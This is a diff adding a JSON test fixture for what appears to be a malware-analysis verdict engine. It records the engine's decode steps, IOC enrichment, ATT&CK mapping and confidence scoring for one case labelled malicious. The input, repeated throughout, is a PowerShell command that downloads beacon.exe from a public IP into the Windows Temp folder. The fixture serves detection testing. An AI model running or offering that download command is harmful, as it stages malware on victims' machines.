@@ -1,0 +1,2946 @@
+{
+  "case": {
+    "id": "mal-plain-ps-download",
+    "category": "malicious",
+    "label": "Plain PS Invoke-WebRequest + public IP",
+    "expected_verdict_class": [
+      "malicious"
+    ],
+    "input": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\""
+  },
+  "cio": {
+    "schema_version": "0.1",
+    "cio_id": "CIO-45f050b1a4ce",
+    "created_at": "2026-08-01T10:44:39.057027Z",
+    "source": {
+      "surface": "api",
+      "endpoint": "/api/decode/smart",
+      "correlation_id": null
+    },
+    "input_text": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+    "input_kind": "text",
+    "artifacts": [],
+    "decode_chain": [
+      {
+        "idx": 0,
+        "op": "extract-payload",
+        "input_kind": "",
+        "output_kind": "Payload isolation (script wrapper strip)",
+        "preview": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+        "reason": "Isolated payload string from script/command wrapper",
+        "node_id": "N-002"
+      },
+      {
+        "idx": 1,
+        "op": "family-cobaltstrike",
+        "input_kind": "",
+        "output_kind": "family-cobaltstrike",
+        "preview": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+        "reason": "Applied family-cobaltstrike",
+        "node_id": "N-003"
+      }
+    ],
+    "evidence_graph": {
+      "nodes": [
+        {
+          "id": "N-001",
+          "kind": "artifact",
+          "label": "Input \u00b7 text",
+          "value": null,
+          "confidence": 1.0,
+          "provenance": "input",
+          "attrs": {
+            "input_kind": "text",
+            "length": 106
+          }
+        },
+        {
+          "id": "N-002",
+          "kind": "decoded_fragment",
+          "label": "Layer 0: extract-payload",
+          "value": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+          "confidence": 0.85,
+          "provenance": "decoder:extract-payload",
+          "attrs": {
+            "idx": 0,
+            "op": "extract-payload",
+            "input_kind": "",
+            "output_kind": "Payload isolation (script wrapper strip)"
+          }
+        },
+        {
+          "id": "N-003",
+          "kind": "decoded_fragment",
+          "label": "Layer 1: family-cobaltstrike",
+          "value": "powershell -c \"Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\\Windows\\Temp\\beacon.exe\"",
+          "confidence": 0.85,
+          "provenance": "decoder:family-cobaltstrike",
+          "attrs": {
+            "idx": 1,
+            "op": "family-cobaltstrike",
+            "input_kind": "",
+            "output_kind": "family-cobaltstrike"
+          }
+        },
+        {
+          "id": "N-004",
+          "kind": "ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "value": "http://185.220.101.5/beacon.exe",
+          "confidence": 0.9,
+          "provenance": "extractor:ioc",
+          "attrs": {
+            "ioc_kind": "url",
+            "normalized": "http://185.220.101.5/beacon.exe",
+            "stages": [
+              "syntactic",
+              "context"
+            ],
+            "enrichment": {
+              "providers": [
+                {
+                  "name": "VirusTotal",
+                  "state": "no-key",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "VT API key not configured",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": null
+                },
+                {
+                  "name": "AlienVault OTX",
+                  "state": "no-hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "0 OTX pulses",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://otx.alienvault.com/indicator/url/http://185.220.101.5/beacon.exe"
+                },
+                {
+                  "name": "URLScan.io",
+                  "state": "hit",
+                  "malicious": 0,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "46 URLScan submissions \u00b7 0 flagged malicious",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://urlscan.io/result/019f7ee0-c5bf-762d-867c-698f057b7e6b/"
+                },
+                {
+                  "name": "URLhaus",
+                  "state": "no-hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://urlhaus.abuse.ch/url/http://185.220.101.5/beacon.exe"
+                }
+              ],
+              "reputation": null,
+              "first_seen": null,
+              "last_seen": null,
+              "hit_count": 1,
+              "provider_count": 4,
+              "engine": "shared:workspace"
+            }
+          }
+        },
+        {
+          "id": "N-005",
+          "kind": "ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "value": "185.220.101.5",
+          "confidence": 0.9,
+          "provenance": "extractor:ioc",
+          "attrs": {
+            "ioc_kind": "ip",
+            "normalized": "185.220.101.5",
+            "stages": [
+              "syntactic",
+              "context"
+            ],
+            "enrichment": {
+              "providers": [
+                {
+                  "name": "VirusTotal",
+                  "state": "no-key",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "VT API key not configured",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": null
+                },
+                {
+                  "name": "AbuseIPDB",
+                  "state": "hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": 100,
+                  "detail": "Abuse score 100/100 \u00b7 202 reports \u00b7 Fixed Line ISP",
+                  "first_seen": null,
+                  "last_seen": "2026-08-01T09:44:11+00:00",
+                  "tags": [
+                    "Tor exit",
+                    "DE",
+                    "Artikel10 e.V."
+                  ],
+                  "link": "https://www.abuseipdb.com/check/185.220.101.5"
+                },
+                {
+                  "name": "AlienVault OTX",
+                  "state": "hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": 0,
+                  "detail": "50 OTX pulses \u00b7 Gifted1 Live Perimeter Threat Intelligence Feed; IOC Records Provided by @NextRayAI",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [
+                    "Scanner",
+                    "Malicious-IP",
+                    "Threat-Intel",
+                    "Nextray",
+                    "cyber security",
+                    "ioc"
+                  ],
+                  "link": "https://otx.alienvault.com/indicator/ip/185.220.101.5"
+                }
+              ],
+              "reputation": 50,
+              "first_seen": null,
+              "last_seen": "2026-08-01T09:44:11+00:00",
+              "hit_count": 2,
+              "provider_count": 3,
+              "engine": "shared:workspace"
+            }
+          }
+        },
+        {
+          "id": "N-006",
+          "kind": "mitre_technique",
+          "label": "Ingress Tool Transfer",
+          "value": "T1105",
+          "confidence": 0.8,
+          "provenance": "mitre:inferred",
+          "attrs": {
+            "technique_id": "T1105",
+            "tactic": "Command and Control",
+            "name": "Ingress Tool Transfer"
+          }
+        },
+        {
+          "id": "N-007",
+          "kind": "mitre_technique",
+          "label": "PowerShell",
+          "value": "T1059.001",
+          "confidence": 0.8,
+          "provenance": "mitre:inferred",
+          "attrs": {
+            "technique_id": "T1059.001",
+            "tactic": "Execution",
+            "name": "PowerShell"
+          }
+        },
+        {
+          "id": "N-008",
+          "kind": "mitre_technique",
+          "label": "Local staging in Public/ProgramData/Temp directory",
+          "value": "T1074.001",
+          "confidence": 0.8,
+          "provenance": "mitre:inferred",
+          "attrs": {
+            "technique_id": "T1074.001",
+            "tactic": "Collection",
+            "name": "Local staging in Public/ProgramData/Temp directory"
+          }
+        },
+        {
+          "id": "N-009",
+          "kind": "lolbin",
+          "label": "LOLBIN \u00b7 powershell",
+          "value": "powershell",
+          "confidence": 0.7,
+          "provenance": "rule:lolbin_scan",
+          "attrs": {
+            "binary": "powershell"
+          }
+        },
+        {
+          "id": "SYNTH-CHAIN-3",
+          "kind": "behaviour",
+          "label": "Correlated evidence chain \u00b7 3 stages",
+          "value": "execution_chain_correlated",
+          "confidence": 0.8,
+          "provenance": "verdict-engine/graph-topology",
+          "attrs": {
+            "synthetic": true,
+            "signal": "graph_topology",
+            "chain_depth": 3,
+            "chain_path": [
+              "N-002",
+              "N-003",
+              "N-004"
+            ]
+          }
+        },
+        {
+          "id": "N-010",
+          "kind": "verdict",
+          "label": "Verdict \u00b7 Malicious",
+          "value": "Malicious",
+          "confidence": 0.9746,
+          "provenance": "engine:unified-verdict",
+          "attrs": {
+            "confidence_pct": 97
+          }
+        },
+        {
+          "id": "REC-A-0-0001",
+          "kind": "ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "value": "http://185.220.101.5/beacon.exe",
+          "confidence": 0.85,
+          "provenance": "recursive:A-0",
+          "attrs": {
+            "ioc_kind": "url",
+            "enrichment": {
+              "providers": [
+                {
+                  "name": "VirusTotal",
+                  "state": "no-key",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "VT API key not configured",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": null
+                },
+                {
+                  "name": "AlienVault OTX",
+                  "state": "no-hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "0 OTX pulses",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://otx.alienvault.com/indicator/url/http://185.220.101.5/beacon.exe"
+                },
+                {
+                  "name": "URLScan.io",
+                  "state": "hit",
+                  "malicious": 0,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "46 URLScan submissions \u00b7 0 flagged malicious",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://urlscan.io/result/019f7ee0-c5bf-762d-867c-698f057b7e6b/"
+                },
+                {
+                  "name": "URLhaus",
+                  "state": "no-hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": "https://urlhaus.abuse.ch/url/http://185.220.101.5/beacon.exe"
+                }
+              ],
+              "reputation": null,
+              "first_seen": null,
+              "last_seen": null,
+              "hit_count": 1,
+              "provider_count": 4,
+              "engine": "shared:workspace"
+            }
+          }
+        },
+        {
+          "id": "REC-A-0-0002",
+          "kind": "ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "value": "185.220.101.5",
+          "confidence": 0.8,
+          "provenance": "recursive:A-0",
+          "attrs": {
+            "ioc_kind": "ip",
+            "enrichment": {
+              "providers": [
+                {
+                  "name": "VirusTotal",
+                  "state": "no-key",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": null,
+                  "detail": "VT API key not configured",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [],
+                  "link": null
+                },
+                {
+                  "name": "AbuseIPDB",
+                  "state": "hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": 100,
+                  "detail": "Abuse score 100/100 \u00b7 202 reports \u00b7 Fixed Line ISP",
+                  "first_seen": null,
+                  "last_seen": "2026-08-01T09:44:11+00:00",
+                  "tags": [
+                    "Tor exit",
+                    "DE",
+                    "Artikel10 e.V."
+                  ],
+                  "link": "https://www.abuseipdb.com/check/185.220.101.5"
+                },
+                {
+                  "name": "AlienVault OTX",
+                  "state": "hit",
+                  "malicious": null,
+                  "suspicious": null,
+                  "harmless": null,
+                  "reputation": 0,
+                  "detail": "50 OTX pulses \u00b7 Gifted1 Live Perimeter Threat Intelligence Feed; IOC Records Provided by @NextRayAI",
+                  "first_seen": null,
+                  "last_seen": null,
+                  "tags": [
+                    "Scanner",
+                    "Malicious-IP",
+                    "Threat-Intel",
+                    "Nextray",
+                    "cyber security",
+                    "ioc"
+                  ],
+                  "link": "https://otx.alienvault.com/indicator/ip/185.220.101.5"
+                }
+              ],
+              "reputation": 50,
+              "first_seen": null,
+              "last_seen": "2026-08-01T09:44:11+00:00",
+              "hit_count": 2,
+              "provider_count": 3,
+              "engine": "shared:workspace"
+            }
+          }
+        }
+      ],
+      "edges": [
+        {
+          "source": "N-001",
+          "target": "N-002",
+          "kind": "produces",
+          "weight": 1.0
+        },
+        {
+          "source": "N-002",
+          "target": "N-003",
+          "kind": "produces",
+          "weight": 1.0
+        },
+        {
+          "source": "N-003",
+          "target": "N-004",
+          "kind": "produces",
+          "weight": 1.0
+        },
+        {
+          "source": "N-003",
+          "target": "N-005",
+          "kind": "produces",
+          "weight": 1.0
+        },
+        {
+          "source": "N-003",
+          "target": "N-006",
+          "kind": "references",
+          "weight": 0.8
+        },
+        {
+          "source": "N-003",
+          "target": "N-007",
+          "kind": "references",
+          "weight": 0.8
+        },
+        {
+          "source": "N-003",
+          "target": "N-008",
+          "kind": "references",
+          "weight": 0.8
+        },
+        {
+          "source": "N-003",
+          "target": "N-009",
+          "kind": "references",
+          "weight": 0.7
+        },
+        {
+          "source": "N-005",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.3
+        },
+        {
+          "source": "N-006",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.3
+        },
+        {
+          "source": "SYNTH-CHAIN-3",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.3
+        },
+        {
+          "source": "N-009",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.3
+        },
+        {
+          "source": "N-007",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.2
+        },
+        {
+          "source": "N-008",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.2
+        },
+        {
+          "source": "N-004",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.1
+        },
+        {
+          "source": "N-002",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.1
+        },
+        {
+          "source": "N-003",
+          "target": "N-010",
+          "kind": "contributes_to",
+          "weight": 0.1
+        }
+      ]
+    },
+    "reasoning_steps": [
+      {
+        "step_id": "RS-001",
+        "timestamp": "2026-01-01T00:00:01Z",
+        "rule": "input.ingest",
+        "input_nodes": [],
+        "output_nodes": [
+          "N-001"
+        ],
+        "confidence_before": 0.0,
+        "confidence_after": 0.0,
+        "explanation": "Received text artifact (106 chars) for investigation."
+      },
+      {
+        "step_id": "RS-002",
+        "timestamp": "2026-01-01T00:00:02Z",
+        "rule": "decoder.extract-payload",
+        "input_nodes": [
+          "N-001"
+        ],
+        "output_nodes": [
+          "N-002"
+        ],
+        "confidence_before": 0.0,
+        "confidence_after": 0.05,
+        "explanation": "Decoder 'extract-payload' peeled one layer of the payload."
+      },
+      {
+        "step_id": "RS-003",
+        "timestamp": "2026-01-01T00:00:03Z",
+        "rule": "decoder.family-cobaltstrike",
+        "input_nodes": [
+          "N-002"
+        ],
+        "output_nodes": [
+          "N-003"
+        ],
+        "confidence_before": 0.05,
+        "confidence_after": 0.1,
+        "explanation": "Decoder 'family-cobaltstrike' peeled one layer of the payload."
+      },
+      {
+        "step_id": "RS-004",
+        "timestamp": "2026-01-01T00:00:04Z",
+        "rule": "ioc.url.extract",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-004"
+        ],
+        "confidence_before": 0.1,
+        "confidence_after": 0.2,
+        "explanation": "Recovered URL `http://185.220.101.5/beacon.exe` from the decoded payload."
+      },
+      {
+        "step_id": "RS-005",
+        "timestamp": "2026-01-01T00:00:05Z",
+        "rule": "ioc.ip.extract",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-005"
+        ],
+        "confidence_before": 0.2,
+        "confidence_after": 0.3,
+        "explanation": "Recovered IP address `185.220.101.5` from the decoded payload."
+      },
+      {
+        "step_id": "RS-006",
+        "timestamp": "2026-01-01T00:00:06Z",
+        "rule": "mitre.map.T1105",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-006"
+        ],
+        "confidence_before": 0.3,
+        "confidence_after": 0.38,
+        "explanation": "Mapped to ATT&CK T1105 \u00b7 Ingress Tool Transfer \u2014 inferred from the decoded payload's behaviour."
+      },
+      {
+        "step_id": "RS-007",
+        "timestamp": "2026-01-01T00:00:07Z",
+        "rule": "mitre.map.T1059.001",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-007"
+        ],
+        "confidence_before": 0.38,
+        "confidence_after": 0.46,
+        "explanation": "Mapped to ATT&CK T1059.001 \u00b7 PowerShell \u2014 inferred from the decoded payload's behaviour."
+      },
+      {
+        "step_id": "RS-008",
+        "timestamp": "2026-01-01T00:00:08Z",
+        "rule": "mitre.map.T1074.001",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-008"
+        ],
+        "confidence_before": 0.46,
+        "confidence_after": 0.54,
+        "explanation": "Mapped to ATT&CK T1074.001 \u00b7 Local staging in Public/ProgramData/Temp directory \u2014 inferred from the decoded payload's behaviour."
+      },
+      {
+        "step_id": "RS-009",
+        "timestamp": "2026-01-01T00:00:09Z",
+        "rule": "lolbin.detect.powershell",
+        "input_nodes": [
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-009"
+        ],
+        "confidence_before": 0.54,
+        "confidence_after": 0.59,
+        "explanation": "Detected LOLBIN reference to `powershell` \u2014 signed binary can proxy execution and evade allow-lists."
+      },
+      {
+        "step_id": "RS-010",
+        "timestamp": "2026-01-01T00:00:10Z",
+        "rule": "verdict.compute",
+        "input_nodes": [
+          "N-005",
+          "N-006",
+          "SYNTH-CHAIN-3",
+          "N-009",
+          "N-007",
+          "N-008",
+          "N-004",
+          "N-002",
+          "N-003"
+        ],
+        "output_nodes": [
+          "N-010"
+        ],
+        "confidence_before": 0.59,
+        "confidence_after": 0.59,
+        "explanation": "Verdict derived from class distribution: 0 critical \u00b7 4 high \u00b7 2 medium \u00b7 3 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 Correlated evidence chain \u00b7 3 stages [high, w=3.0]."
+      }
+    ],
+    "confidence": 0.9879,
+    "verdict": {
+      "label": "Malicious",
+      "confidence": 0.9879,
+      "confidence_pct": 99,
+      "reason": "Verdict derived from class distribution: 0 critical \u00b7 5 high \u00b7 2 medium \u00b7 4 low \u00b7 0 context. Top contributors: IP \u00b7 185.220.101.5 [high, w=3.0] \u00b7 Ingress Tool Transfer [high, w=3.0] \u00b7 IP \u00b7 185.220.101.5 [high, w=3.0].",
+      "contributors": [
+        {
+          "node_id": "N-005",
+          "kind": "external_ioc_ip",
+          "weight": 3.0,
+          "confidence": 0.9,
+          "category": "external_ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "evidence_class": "high",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-006",
+          "kind": "network_staging",
+          "weight": 3.0,
+          "confidence": 0.8,
+          "category": null,
+          "label": "Ingress Tool Transfer",
+          "evidence_class": "high",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "REC-A-0-0002",
+          "kind": "external_ioc_ip",
+          "weight": 3.0,
+          "confidence": 0.8,
+          "category": "external_ioc",
+          "label": "IP \u00b7 185.220.101.5",
+          "evidence_class": "high",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "SYNTH-CHAIN-3",
+          "kind": "execution_chain_correlated",
+          "weight": 3.0,
+          "confidence": 0.8,
+          "category": null,
+          "label": "Correlated evidence chain \u00b7 3 stages",
+          "evidence_class": "high",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-009",
+          "kind": "lolbin",
+          "weight": 3.0,
+          "confidence": 0.7,
+          "category": null,
+          "label": "LOLBIN \u00b7 powershell",
+          "evidence_class": "high",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-007",
+          "kind": "mitre_technique",
+          "weight": 2.0,
+          "confidence": 0.8,
+          "category": null,
+          "label": "PowerShell",
+          "evidence_class": "medium",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-008",
+          "kind": "mitre_technique",
+          "weight": 2.0,
+          "confidence": 0.8,
+          "category": null,
+          "label": "Local staging in Public/ProgramData/Temp directory",
+          "evidence_class": "medium",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-004",
+          "kind": "external_ioc_url",
+          "weight": 1.0,
+          "confidence": 0.9,
+          "category": "external_ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "evidence_class": "low",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-002",
+          "kind": "base64_layer",
+          "weight": 1.0,
+          "confidence": 0.85,
+          "category": null,
+          "label": "internal decoder step",
+          "evidence_class": "low",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "N-003",
+          "kind": "base64_layer",
+          "weight": 1.0,
+          "confidence": 0.85,
+          "category": null,
+          "label": "internal decoder step",
+          "evidence_class": "low",
+          "source": "graph",
+          "escalated_by": null
+        },
+        {
+          "node_id": "REC-A-0-0001",
+          "kind": "external_ioc_url",
+          "weight": 1.0,
+          "confidence": 0.85,
+          "category": "external_ioc",
+          "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "evidence_class": "low",
+          "source": "graph",
+          "escalated_by": null
+        }
+      ],
+      "not_counted": [],
+      "escalation_rule": null,
+      "engine": "unified-verdict-engine-v1",
+      "confidence_breakdown": {
+        "critical": 0,
+        "high": 96,
+        "medium": 54,
+        "low": 30,
+        "context": 0,
+        "mitigating": 0
+      },
+      "confidence_timeline": [
+        {
+          "stage": 1,
+          "contributor_label": "IP \u00b7 185.220.101.5",
+          "contributor_kind": "external_ioc_ip",
+          "class": "high",
+          "confidence_pct": 54,
+          "source": "graph"
+        },
+        {
+          "stage": 2,
+          "contributor_label": "Ingress Tool Transfer",
+          "contributor_kind": "network_staging",
+          "class": "high",
+          "confidence_pct": 76,
+          "source": "graph"
+        },
+        {
+          "stage": 3,
+          "contributor_label": "IP \u00b7 185.220.101.5",
+          "contributor_kind": "external_ioc_ip",
+          "class": "high",
+          "confidence_pct": 88,
+          "source": "graph"
+        },
+        {
+          "stage": 4,
+          "contributor_label": "Correlated evidence chain \u00b7 3 stages",
+          "contributor_kind": "execution_chain_correlated",
+          "class": "high",
+          "confidence_pct": 94,
+          "source": "graph"
+        },
+        {
+          "stage": 5,
+          "contributor_label": "LOLBIN \u00b7 powershell",
+          "contributor_kind": "lolbin",
+          "class": "high",
+          "confidence_pct": 96,
+          "source": "graph"
+        },
+        {
+          "stage": 6,
+          "contributor_label": "PowerShell",
+          "contributor_kind": "mitre_technique",
+          "class": "medium",
+          "confidence_pct": 97,
+          "source": "graph"
+        },
+        {
+          "stage": 7,
+          "contributor_label": "Local staging in Public/ProgramData/Temp directory",
+          "contributor_kind": "mitre_technique",
+          "class": "medium",
+          "confidence_pct": 98,
+          "source": "graph"
+        },
+        {
+          "stage": 8,
+          "contributor_label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "contributor_kind": "external_ioc_url",
+          "class": "low",
+          "confidence_pct": 98,
+          "source": "graph"
+        },
+        {
+          "stage": 9,
+          "contributor_label": "internal decoder step",
+          "contributor_kind": "base64_layer",
+          "class": "low",
+          "confidence_pct": 99,
+          "source": "graph"
+        },
+        {
+          "stage": 10,
+          "contributor_label": "internal decoder step",
+          "contributor_kind": "base64_layer",
+          "class": "low",
+          "confidence_pct": 99,
+          "source": "graph"
+        },
+        {
+          "stage": 11,
+          "contributor_label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+          "contributor_kind": "external_ioc_url",
+          "class": "low",
+          "confidence_pct": 99,
+          "source": "graph"
+        }
+      ],
+      "explain": {
+        "fired": [
+          {
+            "class": "high",
+            "count": 5,
+            "contributors": [
+              {
+                "node_id": "N-005",
+                "kind": "external_ioc_ip",
+                "label": "IP \u00b7 185.220.101.5",
+                "weight": 3.0,
+                "confidence": 0.9,
+                "source": "graph"
+              },
+              {
+                "node_id": "N-006",
+                "kind": "network_staging",
+                "label": "Ingress Tool Transfer",
+                "weight": 3.0,
+                "confidence": 0.8,
+                "source": "graph"
+              },
+              {
+                "node_id": "REC-A-0-0002",
+                "kind": "external_ioc_ip",
+                "label": "IP \u00b7 185.220.101.5",
+                "weight": 3.0,
+                "confidence": 0.8,
+                "source": "graph"
+              },
+              {
+                "node_id": "SYNTH-CHAIN-3",
+                "kind": "execution_chain_correlated",
+                "label": "Correlated evidence chain \u00b7 3 stages",
+                "weight": 3.0,
+                "confidence": 0.8,
+                "source": "graph"
+              },
+              {
+                "node_id": "N-009",
+                "kind": "lolbin",
+                "label": "LOLBIN \u00b7 powershell",
+                "weight": 3.0,
+                "confidence": 0.7,
+                "source": "graph"
+              }
+            ]
+          },
+          {
+            "class": "medium",
+            "count": 2,
+            "contributors": [
+              {
+                "node_id": "N-007",
+                "kind": "mitre_technique",
+                "label": "PowerShell",
+                "weight": 2.0,
+                "confidence": 0.8,
+                "source": "graph"
+              },
+              {
+                "node_id": "N-008",
+                "kind": "mitre_technique",
+                "label": "Local staging in Public/ProgramData/Temp directory",
+                "weight": 2.0,
+                "confidence": 0.8,
+                "source": "graph"
+              }
+            ]
+          },
+          {
+            "class": "low",
+            "count": 4,
+            "contributors": [
+              {
+                "node_id": "N-004",
+                "kind": "external_ioc_url",
+                "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+                "weight": 1.0,
+                "confidence": 0.9,
+                "source": "graph"
+              },
+              {
+                "node_id": "N-002",
+                "kind": "base64_layer",
+                "label": "internal decoder step",
+                "weight": 1.0,
+                "confidence": 0.85,
+                "source": "graph"
+              },
+              {
+                "node_id": "N-003",
+                "kind": "base64_layer",
+                "label": "internal decoder step",
+                "weight": 1.0,
+                "confidence": 0.85,
+                "source": "graph"
+              },
+              {
+                "node_id": "REC-A-0-0001",
+                "kind": "external_ioc_url",
+                "label": "URL \u00b7 http://185.220.101.5/beacon.exe",
+                "weight": 1.0,
+                "confidence": 0.85,
+                "source": "graph"
+              }
+            ]
+          }
+        ],
+        "missing": [
+          {
+            "reason": "no CRITICAL-class evidence present"
+          }
+        ],
+        "escalations": [
+          {
+            "rule": "encoded PS + IEX + network download",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "encoded_powershell",
+              "invoke_expression"
+            ],
+            "missing_kinds": [
+              "encoded_powershell",
+              "invoke_expression"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "BITS + network download",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "bits_abuse"
+            ],
+            "missing_kinds": [
+              "bits_abuse"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "LOLBIN + persistence + known C2",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "known_c2",
+              "lolbin",
+              "persistence"
+            ],
+            "missing_kinds": [
+              "known_c2",
+              "persistence"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "LOLBIN + malicious hash",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "confirmed_malicious_hash",
+              "lolbin"
+            ],
+            "missing_kinds": [
+              "confirmed_malicious_hash"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "custom recipe (confirmed)",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "custom_recipe_hit"
+            ],
+            "missing_kinds": [
+              "custom_recipe_hit"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "malware family + execution",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "child_process_execution",
+              "sha_matched_family"
+            ],
+            "missing_kinds": [
+              "child_process_execution",
+              "sha_matched_family"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "lateral movement + credential access",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "credential_access",
+              "lateral_movement"
+            ],
+            "missing_kinds": [
+              "credential_access",
+              "lateral_movement"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "reflective injection + LSASS",
+            "promotes_to": "Malicious",
+            "required_kinds": [
+              "lsass_access",
+              "reflective_injection"
+            ],
+            "missing_kinds": [
+              "lsass_access",
+              "reflective_injection"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "encoded PS + IEX",
+            "promotes_to": "Suspicious",
+            "required_kinds": [
+              "encoded_powershell",
+              "invoke_expression"
+            ],
+            "missing_kinds": [
+              "encoded_powershell",
+              "invoke_expression"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "LOLBIN + obfuscated command",
+            "promotes_to": "Suspicious",
+            "required_kinds": [
+              "lolbin",
+              "obfuscated_command"
+            ],
+            "missing_kinds": [
+              "obfuscated_command"
+            ],
+            "status": "skipped"
+          },
+          {
+            "rule": "MITRE persistence technique",
+            "promotes_to": "Suspicious",
+            "required_kinds": [
+              "mitre_technique",
+              "persistence"
+            ],
+            "missing_kinds": [
+              "persistence"
+            ],
+            "status": "skipped"
+          }
+        ],
+        "escalation_applied": null,
+        "confidence_calculation": {
+          "formula": "Noisy-OR over positive contributors, capped, then dampened by mitigators.",
+          "raw_noisy_or_pct": 99,
+          "confidence_cap_pct": 100,
+          "cap_reason": "no cap (0..1.0)",
+          "mitigators_present": 0,
+          "mitigator_dampening_max_pct": 0,
+          "final_confidence_pct": 99
+        }
+      }
+    },
+    "timeline": [
+      {
+        "step_id": "RS-001",
+        "at": "2026-01-01T00:00:01+00:00",
+        "rule": "input.ingest",
+        "explanation": "Received text artifact (106 chars) for investigation.",
+        "input_nodes": [],
+        "output_nodes": [
+          "N-001"
+        ]
+      },
+      {
+        "step_id": "RS-002",
+        "at": "2026-01-01T00:00:02+00:00",
+        "rule": "decoder.extract-payload",
+        "explanation": "Decoder 'extract-payload' peeled one layer of the payload.",
